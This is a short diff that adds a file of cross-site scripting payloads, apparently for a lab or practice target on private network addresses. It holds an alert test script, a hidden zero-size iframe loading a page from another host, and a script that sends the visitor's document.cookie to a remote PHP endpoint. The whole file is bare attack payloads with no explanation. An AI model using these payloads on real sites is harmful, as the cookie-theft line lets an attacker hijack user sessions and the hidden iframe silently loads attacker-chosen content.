@@ -1,0 +1,7 @@
+<script>Alert("XSS");</script>
+
+
+<iframe src="http://192.168.30.5:81/report" height = "0" width = "0"></iframe>
+
+<script>new Image().src="http://192.168.5.81/bogus.php?output="+document.cookie;</script>
+
